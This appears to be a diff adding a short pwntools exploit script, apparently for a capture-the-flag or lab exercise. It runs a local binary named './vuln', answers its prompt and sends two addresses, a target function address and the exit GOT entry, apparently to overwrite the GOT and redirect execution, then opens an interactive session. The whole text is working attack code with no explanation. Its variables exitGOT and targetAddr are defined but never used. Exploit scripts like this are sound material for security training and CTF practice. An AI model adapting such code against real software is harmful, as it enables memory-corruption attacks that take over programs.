@@ -1,0 +1,8 @@
+from pwn import *
+exitGOT = '404048'
+targetAddr = '401276'
+io = process('./vuln')
+io.sendlineafter('\n', 'y')
+io.sendline(str(0x401276)) #target
+io.sendline(str(0x404048)) #exit
+io.interactive()
